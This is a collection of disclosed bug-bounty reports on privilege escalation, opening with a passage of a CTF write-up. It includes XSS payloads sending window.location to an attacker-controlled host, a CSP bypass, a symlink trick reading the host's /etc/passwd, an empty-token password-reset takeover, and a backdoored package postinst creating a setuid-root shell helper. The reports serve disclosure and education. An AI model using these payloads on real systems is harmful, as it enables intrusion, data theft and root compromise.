After a few attempts to include HTML in my user name (`<` and `>` were filtered) or trying to upload arbitrary files, both ways seemed as dead ends. I decided to focus on the account recovery flow. 

After a successful registration, the application would generate a QR code for account recovery. The QR code was a string in the following format:

```
ascii_hex(user@example.com):<some_random_secret_in_hex>
```

After submitting the QR code to `/recover`, the applicaion would respond with a new session giving access to the user account. After some trial and error, I noticed that the application would right-strip `{` (and any subsequent `{` and `}`) characters from the email when generating the QR code.

This meant that registering with `jobert@mydocz.cosmic{` would give back a valid QR code for `jobert@mydocz.cosmic`.

### Step 2 - Wow that's cosmic.

After logging in as `jobert@mydocz.cosmic` the support chat would became available as Jobert was a proper customer. The first thing I did was sending `flag` into the support chat. The response was as follows:

```
{"response":"I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!"}
```

This response would led me to the deepest rabbit hole I've ever went down. 

Anyway, inspecting the JavaScript files included in the page, I learned that it's possible to end the chat with `quit` or `finish`. Once a chat ended, the application would ask for feedback, claiming that a negative, 1-star feedback would be reviewed by support staff. This just begs for blind XSS.

Submitting a simple XSS payload would confirm that vulnerability on the current page. However, there was a CSP preventing inline script execution:

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *
```

Seeing that CSP instantly reminded me of [Michał Bentkowski's tweet](https://twitter.com/SecurityMB/status/1162690916722839552). It turns out that raw.githack.com would decode the URL path and therefore it was trivial to bypass using:

```
<script src='https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js'></script>
```

The first payload that I used was `fetch('https://<domain-under-my-control>')` to confirm the vulnerability. However, because of the `default-src` directive it wasn't possible to make connections other than to `self` (`connect-src`). I ended up bypassing this via `window.location = 'https://<domain-under-my-control>'`.

As you can see [in my commit history](https://github.com/bayotop/playground/commits/master) I was stuck at this point for quite a while. The page was rendered in a headless Chrome instance without an authenticated session. As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and `window.location`.

### Step 3 - One HTML injection isn't enough. 

The DOM revealed that the support stuff had the ability to change a user's name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn't sanitized this time! This allowed to change a user's name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using `<iframe src='https://<domain-under-my-control>'></iframe>`. Afterwards, I used a different payload - `<script>window.location='http://ip-under-my-control'+window.location</script>` - to learn the context I was in. 

It was `http://localhost:3000/converter/<random-id>.png?user_name=<user_name>`. This meant that I couldn't simply access `file://`.

### Step 4 - The "secret" was 9222.

At this point I got stuck for a long long time. I tried to find other services listening locally (using [aquatone's xlarge list](https://github.com/michenriksen/aquatone)). I was looking for parameter injection through the user name trying to inject `--allow-file-access-from-file` when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.

I had a lightbulb moment: `I think someone is converting top secret documents as we speak!`. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user's username and email were `admin` and `admin@mydocz.cosmic`). It wasn't possible to recover into that account. It all made sense. I had to use the support staff's endpoint to change the admin's user name to `<script>window.location='http://<ip-under-my-control>'</script>` and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal ([jobert's older tweet](https://twitter.com/jobertabma/status/1071091295425191937) was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.

While doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:

```
/var/log/nginx/access.log ... "GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1" ...
/var/log/nginx/access.log ... "GET /?x=see_you_in_San_Francisco HTTP/1.1" ...
/var/log/nginx/access.log ... "GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1" ...
```

I'm super sorry for interfering! Hopefully I didn't cause too much harm. Please let me know if you managed to grab that swag pack (ideally once we meet in SF :)).

I started to realize this wouldn't work, however, I had no other ideas. Until I saw these 2 messages in a Slack thread (thanks [@soiaxx](https://twitter.com/soiaxx)):

```
if it's chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:
if you can run javascript :smile: so much ifs
```

*For the sake of transparency, it was a completely unrelated thread. I'm not sure if the involved parties knew about this particular CTF.*

I tried setting my user name to `<iframe width=900 height=900 src="http://localhost:9222/"></iframe>` and uploaded a file. It worked, it rendered two words: "Inspectable WebContents". [This StackOverflow answer](https://stackoverflow.com/a/29893173/5136654) mentions a `/json` endpoint showing available debug targets. Jackpot:

{F691310}

Requesting https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab would reveal the flag: **h1ctf{y3s_1m_c0sm1c_n0w}**.

## Impact

Mostly sleep deprivation.

---

### [China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability](https://hackerone.com/reports/412481)

- **Report ID:** `412481`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @b006e4ea768a5d1b5340969
- **Bounty:** - usd
- **Disclosed:** 2020-01-29T01:17:24.371Z
- **CVE(s):** -

**Vulnerability Information:**

### 1, Summary
During the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files, so you can read the server's intranet IP, the physical address of the website application and read the website web.config file.
###2, Vulnerability scope
https://ecjobsdc.starbucks.com.cn
###3, proof of exploit

By modifying the suffix of filename, this address can be uploaded to upload html and shtml files, so that you can read the server's intranet IP, the physical address of the website application, and the configuration file of the website.
Vulnerability certificate

```
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Connection: close
Content-Length: 234
Cache-Control: max-age=0
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryevPInYidBxSvSd06
Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"
Content-Type: text/html

<?php echo 1111;>
------WebKitFormBoundaryevPInYidBxSvSd06--
```

Successfully read the website's remoteaddr webpathinfo web.config file.

```
DOCUMENT_NAMED:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
SERVER_SOFTWARE :Microsoft-IIS/8.5
SERVER_NAME :ecjobsdc.starbucks.com.cn
SERVER_PORT :80
REMOTE_ADDR:10.92.29.50
REMOTE_HOST:10.92.29.50
D:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpRedirect enabled="false" destination="https://ecjobs.starbucks.net" exactDestination="false" />
    </system.webServer>
</configuration>
```
{F349302}
{F349303}

## Impact

Phishing attack, remote file reading

**Summary (team):**

neweq discovered that ecjobsdc.starbucks.com.cn had a file upload vulnerability that permitted an attacker to upload html and shtml files which could then be accessed in a browser.

@neweq — thank you for reporting this vulnerability.

---

### [Subdomain takeover of storybook.lystit.com](https://hackerone.com/reports/779442)

- **Report ID:** `779442`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Lyst
- **Reporter:** @parzel
- **Bounty:** 1000 usd
- **Disclosed:** 2020-01-22T14:38:48.812Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary:
The subdomain storybook.lystit.com had an CNAME record pointing to an unclaimed S3 bucket. This is a high severity security issue because an attacker can register the bucket on AWS and therefore can serve her own content on the subdomain. This allows for various attacks.

# Description:
The dangling CNAME record of storybook.lystit.com is pointing to ███████ and the bucket which could not be found was: "storybook.lystit.com". I was able to register a S3 bucket with this name in AWS. After enabling static website hosting I was able to takeover the subdomain and serve arbitrary content. I am serving a POC to proof I am controlling the subdomain as well as a simple XSS POC.

# POC
POC: view-source:http://storybook.lystit.com/
Stored XSS: http://storybook.lystit.com/asdjklkas1312das879123.html
{F691531}
{F691530}

# Supporting Material/References:
https://www.hackerone.com/blog/Guide-Subdomain-Takeovers

# Recommendations for fix
Remove the dangling CNAME record from storybook.lystit.com

## Impact

The domain takeover allows various attacks. As the full domain is attacker controlled it can be used to serve XSS attacks, phishing campaigns and might be used to bypass the Same Origin Policy on other lystit.com domains and services.

---

### [Arbitrary File Write as SYSTEM from unprivileged user](https://hackerone.com/reports/583184)

- **Report ID:** `583184`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Valve
- **Reporter:** @b0yd
- **Bounty:** 1250 usd
- **Disclosed:** 2020-01-15T19:35:12.674Z
- **CVE(s):** -

**Summary (team):**

### Note: This report was reviewed and updated after a correction to program scope.
 
 
 
Vulnerability
========

The Steam Client installs a "Steam Client Service" that runs as SYSTEM to update the steam application. This service executes from C:\Program Files (x86)\Common\Steam where permissions are properly set to only allow modification from SYSTEM or the Administrators group.

If the service encounters an error, it writes to the log file C:\Program Files (x86)\Steam\logs\service_log.txt. This is a problem because this particular folder, and the parent folder, have permissions set to "Full Control" to any unprivileged user. A regular user can also trigger an error when the service starts by modifying or deleting the "C:\Program Files (x86)\Steam\bin\steamservice.dll"
file that an unprivileged user also has "Full Control" of.

It also just so happens that the permissions for the "Steam Client Service" allow for starting and stopping by unprivileged users, which facilitates for easy triggering of the exploit.

To exploit this vulnerability, an unprivileged user can create a [symlink](https://github.com/googleprojectzero/symboliclink-testing-tools/tree/master/CreateSymlink) between the "C:\Program Files (x86)\Steam\logs\service_log.txt" file and any destination file that SYSTEM can write to. Next they would modify, move, or delete the "C:\Program Files (x86)\Steam\bin\steamservice.dll" to trigger an error message to be written. Finally they would start the "Steam Client Service" service to force the file write. The following video demonstrates writing to C:\Windows\System32\evil.dll and also C:\Windows\System32\drivers\pci.sys
to break the box.

Fix
===

The primary fix for this vulnerability would be to move the log file for the "Steam Client Service" to a directory with proper permissions set, C:\Program Files (x86)\Common\Steam, would be a viable option. If the service is making any other privileged writes in the C:\Program Files (x86)\Steam folder, they would need to be addressed as well.

References
=======

https://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html

Impact
=====

A unprivileged user can write to any file on the file system with SYSTEM privileges.

---

### [App Takeover ( makerdao.herokuapp.com )](https://hackerone.com/reports/664044)

- **Report ID:** `664044`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @m7mdharoun
- **Bounty:** - usd
- **Disclosed:** 2020-01-15T10:57:28.555Z
- **CVE(s):** -

**Summary (team):**

Takeover of an old app that is no longer used by the company.

---

### [WooCommerce Blacklist in 'map_meta_cap' leads to Privilege Escalation of Shopmanagers](https://hackerone.com/reports/403039)

- **Report ID:** `403039`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Automattic
- **Reporter:** @simonscannell
- **Bounty:** - usd
- **Disclosed:** 2019-12-19T14:25:01.563Z
- **CVE(s):** -

**Vulnerability Information:**

When the Shopmanager role is defined for the first time, it receives the following WordPress core privileges:

```
	// Shop manager role.
		add_role(
			'shop_manager',
			'Shop manager',
			array(
				'level_9'                => true,
				'level_8'                => true,
				'level_7'                => true,
				'level_6'                => true,
				'level_5'                => true,
				'level_4'                => true,
				'level_3'                => true,
				'level_2'                => true,
				'level_1'                => true,
				'level_0'                => true,
				'read'                   => true,
				'read_private_pages'     => true,
				'read_private_posts'     => true,
				'edit_users'             => true,
				'edit_posts'             => true,
				'edit_pages'             => true,
				'edit_published_posts'   => true,
				'edit_published_pages'   => true,
				'edit_private_pages'     => true,
				'edit_private_posts'     => true,
				'edit_others_posts'      => true,
				'edit_others_pages'      => true,
				'publish_posts'          => true,
				'publish_pages'          => true,
				'delete_posts'           => true,
				'delete_pages'           => true,
				'delete_private_pages'   => true,
				'delete_private_posts'   => true,
				'delete_published_pages' => true,
				'delete_published_posts' => true,
				'delete_others_posts'    => true,
				'delete_others_pages'    => true,
				'manage_categories'      => true,
				'manage_links'           => true,
				'moderate_comments'      => true,
				'upload_files'           => true,
				'export'                 => true,
				'import'                 => true,
				'list_users'             => true,
			)
		);
```

Most interestingly is the following privilege:

```
'edit_users'             => true,
```

With edit_users privileges, Shop managers can by default edit any user and set any user to any user role (including Admin). Since this is obviously not desirable, WordPress added meta capabilities. This allows to restrict Shop managers to not simply assign themselves Admin privileges.

WooCommerce implements these restrictions the following way:

```
/**
 * Modify capabilities to prevent non-admin users editing admin users.
 *
 * $args[0] will be the user being edited in this case.
 *
 * @param  array  $caps    Array of caps.
 * @param  string $cap     Name of the cap we are checking.
 * @param  int    $user_id ID of the user being checked against.
 * @param  array  $args    Arguments.
 * @return array
 */
function wc_modify_map_meta_cap( $caps, $cap, $user_id, $args ) {
	switch ( $cap ) {
		case 'edit_user':
		case 'remove_user':
		case 'promote_user':
		case 'delete_user':
			if ( ! isset( $args[0] ) || $args[0] === $user_id ) {
				break;
			} else {
				if ( user_can( $args[0], 'administrator' ) && ! current_user_can( 'administrator' ) ) {
					$caps[] = 'do_not_allow';
				}
			}
			break;
	}
	return $caps;
}
add_filter( 'map_meta_cap', 'wc_modify_map_meta_cap', 10, 4 );
```

Whenever any capability related to users is in question, WooCommerce disallows it if the target for the modification is an admin. 

However, this "blacklist" kind of approach is insufficient. The consequence is that a Shop manager can modify any user and can assign any user role that is not admin.

This means that if I were to hack a Shopmanager account, who does NOT posses the "unfiltered_html" capability, I can simply assign the user role editor, which does have the ability to post JavaScript code, to a random user or customer, change their password, log in and then get a Stored XSS working and hack the admin.

Also, if there are any other custom user roles registered on a Wordpress installation, I can also assign those to me.

For example, the Plugin https://de.wordpress.org/plugins/backwpup/ registers the user type BackWpUp Admin, a user who can create and download backups of the WordPress installation.


Proof of Concept:

Simply login as a Shop manager, set the user role of a random user (e.g. a customer) to editor, change their password and then log into WordPress as that user. Then create a Post with your JavaScript Payload.

## Impact

Since Stored XSS is a very reliable way to escalate your privileges to Admin and this is occurs in every WooCommerce installation, I marked this as a high impact.

---

### [Bulgaria - Subdomain takeover of mail.starbucks.bg](https://hackerone.com/reports/736863)

- **Report ID:** `736863`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @nukedx
- **Bounty:** - usd
- **Disclosed:** 2019-12-12T21:33:20.211Z
- **CVE(s):** -

**Summary (team):**

nukedx discovered that the mail.starbucks.bg domain was pointing to a mail service from icn.bg and confirmed that icn.bg did not host this domain. nukedx successfully claimed the subdomain from icn.bg, configured login credentials through the web panel and setup a valid email server. nukedx then sent a successful test from an @mail.starbucks.bg email address as a valid POC.

@nukedx — thank you for reporting this vulnerability and confirming the resolution.

**Summary (researcher):**

I was checking Rapid7's fdns dataset for my academic research about cloud services and security issues related with them, a part of research is focused on subdomain hijacking, since Starbucks had some historic reports related to it, I scanned `*.starbucks.*` on entire dataset, figured out **mail.starbucks.bg** was pointing unclaimed service from **icn.bg**, claimed profile and successfully hijacked subdomain with it.

Unfortunately this was only giving mail hosting capabilities so it wasn't full subdomain takeover, kudos for Starbucks team to still accepting this and rewarding it despite being not full subdomain takeover.

It's always pleasure to report Starbucks, they always handle all reports professionally. I hope in future I'll work with them again.

---

### [Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests](https://hackerone.com/reports/689314)

- **Report ID:** `689314`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 12000 usd
- **Disclosed:** 2019-11-27T10:02:44.156Z
- **CVE(s):** -

**Vulnerability Information:**

I've found a three minor vulnerabilities which, when combined, allow an attacker to copy private repositories, confidential issues, private snippets, and then some. I'll go through the code path to explain the vulnerabilities and how they are combined. See the **Proof of Concept** section if you want to reproduce it immediately.

Let's start at the `ProjectsController` of EE, which is prepended to `app/controllers/projects_controller.rb` in an EE instance. 

**ee/app/controllers/ee/projects_controller.rb**
```ruby
override :project_params_attributes
    def project_params_attributes
      super + project_params_ee
    end

def project_params_ee
  attrs = %i[
    # ...
    use_custom_template
    # ...
    group_with_project_templates_id
  ]

  # ...

  attrs
end
```

This method defines what parameters can be passed by the user. The two notable parameters here are `use_custom_template` and `group_with_project_templates_id`. This method appends the result value of `project_params_attributes` method in `app/controllers/projects_controller.rb` on line 351, which specifies all the CE attributes a user can provide when creating a project. The CE controller allows the `template_name` parameter to be passed, too. This means that these three parameters can be passed to the `Projects::CreateService` in the `create` method:

**app/controllers/projects_controller.rb**
```ruby
def create
  @project = ::Projects::CreateService.new(current_user, project_params(attributes: project_params_create_attributes)).execute

  # ...
end

# ...

def project_params_attributes
  [
    # ...
    :template_name,
    # ...
  ]
```

In EE, the `EE:Projects::CreateService` is prepended to the `Projects::CreateService`. The prepended EE code contains logic to validate the `use_custom_template` and `group_with_project_templates_id` parameters.

**ee/app/services/ee/projects/create_service.rb**
```ruby
def execute
  # ...

  group_with_project_templates_id = params.delete(:group_with_project_templates_id) if params[:template_name].blank?

  # ...

    validate_namespace_used_with_template(project, group_with_project_templates_id)
end

# ...

def validate_namespace_used_with_template(project, group_with_project_templates_id)
  return unless project.group

  subgroup_with_templates_id = group_with_project_templates_id || params[:group_with_project_templates_id]
  return if subgroup_with_templates_id.blank?

  templates_owner = ::Group.find(subgroup_with_templates_id).parent

  unless templates_owner.self_and_descendants.exists?(id: project.namespace_id)
    project.errors.add(:namespace, _("is not a descendant of the Group owning the template"))
  end
end
```

The code above is where the first vulnerability can be found. In a normal situation, a Project Template can only be copied to a namespace (group) that is a descendant of the project template. However, the `validate_namespace_used_with_template` method returns a `nil` value when the project is **not** being created for a group (`return unless project.group`). This means that if a `group_with_project_templates_id` is given for a project that is created in a `User` namespace, the authorization / validation logic is never executed. This means that the `use_custom_template` and `group_with_project_templates_id` parameters remain to be set on the instance variable `params`.

Because the EE code is prepended, the `execute` method is executed before the `Projects::CreateService` is called. Because the EE class its validation logic is bypassed, the `execute` method of the `Projects::CreateService` class is called:

**app/services/projects/create_service.rb**
```ruby
def execute
  if @params[:template_name].present?
    return ::Projects::CreateFromTemplateService.new(current_user, params).execute
  end

  # ...
end
```

When a `template_name` is given, instead of executing the normal execution flow, the result of `Projects::CreateFromTemplateService` is returned. The CE code for this class isn't very important. The EE class contains the logic that is worth checking out:

**ee/app/services/ee/projects/create_from_template_service.rb**
```ruby
def execute
  return super unless use_custom_template?

  override_params = params.dup
  params[:custom_template] = template_project if template_project

  ::Projects::GitlabProjectsImportService.new(current_user, params, override_params).execute
end

private

def use_custom_template?
  # ...
    template_name &&
      ::Gitlab::Utils.to_boolean(params.delete(:use_custom_template)) &&
      ::Gitlab::CurrentSettings.custom_project_templates_enabled?
  # ...
end

def template_project
  # ...
    current_user.available_custom_project_templates(search: template_name, subgroup_id: subgroup_id)
                .first
  # ...
end

def subgroup_id
  params[:group_with_project_templates_id].presence
end
```

This class does a couple of things: it makes sure a custom template name is given, that it should use the given template name, and that the GitLab instance has custom project templates enabled. For what it's worth: gitlab.com has this setting enabled. When it passes those checks, the `template_project` method is invoked. Here is the definition of the `available_custom_project_templates` method:

**ee/app/models/ee/user.rb**
```ruby
def available_custom_project_templates(search: nil, subgroup_id: nil)
  templates = ::Gitlab::CurrentSettings.available_custom_project_templates(subgroup_id)

  ::ProjectsFinder.new(current_user: self,
                       project_ids_relation: templates,
                       params: { search: search, sort: 'name_asc' })
                  .execute
end
```

This method requires two parameters: `search` and `subgroup_id`. The first one is the `template_name` the user passes, the second one `group_with_project_templates_id`. The `templates` variable gets its value based on the following method definition:

**ee/app/models/ee/application_setting.rb**
```ruby
def available_custom_project_templates(subgroup_id = nil)
  group_id = subgroup_id || custom_project_templates_group_id

  return ::Project.none unless group_id

  ::Project.where(namespace_id: group_id) 
end
```

This method will return all `Project` models based on the `namespace_id` that is provided in the `subgroup_id` parameter. This is then passed to the `ProjectsFinder` in the `available_custom_project_templates` method on the `User` model. This is where the second vulnerability can be found. The `ProjectsFinder` uses an initial collection, which consists of the projects the authenticated user can access. However, it does **not** check the access level of the user. This means that any project that is public, but has Repository, Issue, Snippets (etc.) access disabled for Guests, will be returned by the `available_custom_project_templates` method on the `User` model. In a perfect world, it seems that this method would limit the projects that can be returned based on the user's permissions for said projects.

If we go back to the `EE:Projects::CreateFromTemplateService` file, you can see that the `template_project` will return the first project that is returned by the `available_custom_project_templates` method. This means that `params[:custom_template]` may contain a `Project` model that the user is not authorized to see everything for. The `EE::Projects::CreateFromTemplateService` class then calls the `Projects::GitlabProjectsImportService` class with the updated parameters.

**ee/app/services/ee/projects/gitlab_projects_import_service.rb**
```ruby
def execute
  super.tap do |project|
    if project.saved? && custom_template
      custom_template.add_export_job(current_user: current_user,
                                     after_export_strategy: export_strategy(project))
    end
  end
end

private

override :prepare_import_params
def prepare_import_params
  super

  if custom_template
    params[:import_type] = 'gitlab_custom_project_template'
  end
end

def custom_template
  strong_memoize(:custom_template) do
    params.delete(:custom_template)
  end
end

def export_strategy(project) 
 Gitlab::ImportExport::AfterExportStrategies::CustomTemplateExportImportStrategy.new(export_into_project_id: project.id)
end
```

This EE class is prepended, but uses `super.tap` to call the CE code (`super`) and then taps into the result of the CE code. If `params[:custom_template]` has been set and the project was successfully saved by the `super` call, an export job is scheduled for the `custom_template` that was returned by the `ProjectsFinder`. It's worth nothing that at this point the user may not be authorized to see the code, issues, etc., of the project. Additionally, an export strategy is passed that imports the export file in the newly created project.

This is where the third vulnerability can be found. When an export job is scheduled, it assumes the user is authorized to make the export. Ideally, the Sidekiq job (`ProjectExportWorker`) that is scheduled would do an authorization check to make sure that the user is authorized to export the project. This would also avoid a TOCTOU issue where the user schedules a job when the queue is clogged / Sidekiq workers are paused and would leave the project before the job is executed. When the export is created, it'll automatically be imported in the project that the user has full access to.

Combined, these vulnerabilities results in an attacker being able to obtain any confidential information that is included in a project export. This vulnerability **only** works for public projects with limited access levels for repositories, issues, pipelines, merge requests (and more) that belong to a group. A good example of this would be `gitlab-org`, `gitlab-data`, `gitlab-com`, on gitlab.com. There are plenty of repositories, such as https://gitlab.com/gitlab-com/finance (see below), that are public but don't expose the repository, issues, and merge requests.

{F576178}

# Proof of Concept
To reproduce this vulnerability:

* sign in as a normal user and create a group, let's assume this is group ID 1
* within this group, create a public project named `test_project`
* under **Settings > General** update the **Visibility, project features, permissions** to only allow Issues, Repository, Wiki, and Snippets to be seen by **Only Project Members**:

{F576180}

* sign into another account and go to http://instance/projects/new
* create a new project and intercept the request, it'll look something like this (I've left out unimportant parameters):

```
POST /projects HTTP/1.1
Host: instance
...

----------506740453
Content-Disposition: form-data; name="project[use_custom_template]"

false
----------506740453
Content-Disposition: form-data; name="project[template_name]"

----------506740453
Content-Disposition: form-data; name="project[group_with_project_templates_id]"

----------506740453
Content-Disposition: form-data; name="project[name]"

project_name
----------506740453
Content-Disposition: form-data; name="project[namespace_id]"

1
----------506740453
Content-Disposition: form-data; name="project[path]"

project_name
----------506740453--
```

* in this request, change `use_custom_template` to `true`, the `template_name` to the name the victim gave to the project (`test_project`), and `group_with_project_templates_id` to the group ID of the public group the victim created (`1`). When forwarded, the server will respond with a redirect and, when followed, show a page indicating that the project is being imported:

{F576184}

Depending on the size of the project and how busy the queues are, it can take a couple of minutes to generate the export of the project and then import it to the new project. Come back in a couple minutes and find the repository, confidential issues, private snippets, merge requests, CI pipelines, and more being copied to the attacker's project.

**Redacted copy of `gitlab-com/finance`**
{F576189}

## Impact

Any access level that has been put in place for projects the user can access can be bypassed using this vulnerability. According to the documentation, this means that the following information can be obtained:

* Project and wiki repositories
* Project uploads
* Project configuration, including services
* Issues with comments, merge requests with diffs and comments, labels, milestones, snippets, and other project entities
* LFS objects
* Issue Boards

{F576190}

---

### [Worker container escape lead to arbitrary file reading in host machine [again]](https://hackerone.com/reports/697055)

- **Report ID:** `697055`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Semmle
- **Reporter:** @testanull
- **Bounty:** 2000 usd
- **Disclosed:** 2019-10-21T01:32:16.250Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
After a successful build, LGTM allow user to view the file list.
By default, only source code files and build config files are reserved (``lgtm.yml`` and ``.lgtm.yml``).
If there are both files in folder, LGTM will process ``lgtm.yml`` file and skip ``.lgtm.yml``, but it still keeps both of files in directory.
By making symlink to ``.lgtm.yml`` file, after successful build, it will point to HOST MACHINE file!

## Steps To Reproduce:

1. Create a simple project which LGTM can build successful.
In this report, I use this project (https://github.com/testanull/test11)
2. Create file: ``lgtm.yml``  with a valid config content, for example:

```
extraction:
  java:
    index:
      build_command:
      - ./custom-build
```

3. Make a symlink point to a HOST MACHINE file/directory with name: ``.lgtm.yml``
4. After successful build, ``.lgtm.yml`` file will contain the host machine file content!

##PoC of reading ``/etc/passwd`` is attached below

## Impact

Give attacker ability to explore the host machine, expose more sensitive informations from it.

---

### [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181)

- **Report ID:** `694181`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Semmle
- **Reporter:** @testanull
- **Bounty:** 2000 usd
- **Disclosed:** 2019-10-16T12:34:13.387Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Because lack of security, attacker will be able to remove original log file and replace it will a symlink to other file, 
After finishing job, host machine copy file from docker container.
Because the original log file has been removed, the host machine will copy the symlink file.
But the problem is it doesn't copy the linked file in container, it copys the linked file in the HOST MACHINE.

## Steps To Reproduce:
The attack is very simple, just remove the original build.log file and replace with a symlink file,
I used this configuration to read the ``/etc/passwd``:
```extraction:
  cpp:
    after_prepare:
      - rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

## PoC
Content of ``/etc/passwd`` is attached below

## Impact

Give attacker ability to explore the host machine, expose more sensitive informations from it.

---

### [[Critical] Possibility to takeover any user account #2 without interaction on the https://██████████](https://hackerone.com/reports/544334)

- **Report ID:** `544334`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:16:48.305Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. This time I discovered a way to tekeover any user's account via unsafe password reset.
This time it's much easier than #1 way in the #543678 report.
When users requests the password reset, the next link is come to the email:
```
https://█████/resetpassword.aspx?ru=[user_id]&op=[token]
```
The [user_id] is numeric, always same for same emaill, and incremental for every new user.
The [token] parameter is random and used to protect the link from hijacking.
But, I discovered that Reset password endpoint accepts empty token!

So all the attacker needs, it's to initiate password reset for the victim's email, and request the
```
https://██████████/resetpassword.aspx?ru=[user_id]&op=
```
Since `[user_id]` is numeric and static for same account, it can be easily guessed by the attacker.

##POC
1) Go to the https://█████/ForgotPassword.aspx
2) Initiate reset password for the `██████` (it's my test account)
3) Use this link:
```
https://███/resetpassword.aspx?ru=7655&op=
```
where 7655 - it's my user numeric ID (as we know, it's incremental, and be easily guessed for other accounts).
██████████
4) Set the new password and confirm it. You can set something as `111111111aA!!!!` to pass the password requirements.
5) You will be logged into my organization as admin.

##Suggested fix
Fix the `op` tooken validation - it should be checked properly.

## Impact

Severity: Critical
Immediate account Individual/Cprporate account takeover via password reset. Attacker needs to know only email.

---

### [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host](https://hackerone.com/reports/495495)

- **Report ID:** `495495`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Internet Bug Bounty
- **Reporter:** @adam_iwaniuk
- **Bounty:** - usd
- **Disclosed:** 2019-09-26T20:35:06.848Z
- **CVE(s):** CVE-2019-5736

**Vulnerability Information:**

description here: 
https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html
PoC: https://github.com/q3k/cve-2019-5736-poc

Some more links:
https://seclists.org/oss-sec/2019/q1/119
https://access.redhat.com/security/cve/cve-2019-5736

## Impact

It allows to escape from container to root on host when unpatched version of Docker and Kubernetes are used.
This affects a pretty big part of internet, since a lot of services are using Docker and Kubernets these days.
It has also serious impact on cloud services
AWS https://aws.amazon.com/security/security-bulletins/AWS-2019-002/ and GCP https://cloud.google.com/kubernetes-engine/docs/security-bulletins#february-11-2019-runc
https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/

---

### [Privilege escalation in workers container ](https://hackerone.com/reports/692603)

- **Report ID:** `692603`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Semmle
- **Reporter:** @testanull
- **Bounty:** 1500 usd
- **Disclosed:** 2019-09-25T01:31:38.767Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary about the bugs:
In the prepare step, semmle allows user to install new package.

By upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container

## Steps:

1. Create a malicious package contains the backdoor:

I use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.

With the content of ``postinst`` is

```
#!/bin/sh

ps -ef
sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &

```

Content of ``/opt/src/run``:

```
#include <stdio.h>
void main(int argc, char *argv[]) {
    setreuid(0, 0);
    system(argv[1]);
}
```
